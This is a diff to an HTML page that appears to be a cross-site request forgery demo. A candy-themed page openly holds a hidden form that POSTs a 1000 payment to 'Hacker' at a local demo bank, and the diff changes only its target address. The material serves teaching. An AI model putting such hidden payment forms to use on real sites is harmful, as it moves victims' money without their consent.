@@ -14,7 +14,7 @@
     <p>Look lots of candy ... very innocent.  But in 3 seconds it's going to do a CSRF attack on
     the bank.  View the page source to see how.</p>
     <div style="display: none">
-      <form name="send_payment" id="send_payment" method="POST" action="http://localhost:5000/send_payment/">
+      <form name="send_payment" id="send_payment" method="POST" action="http://127.0.0.1:5000/send_payment/">
         <input name="recipient" value="Hacker" />
         <input name="amount" value="1000" />
       </form>
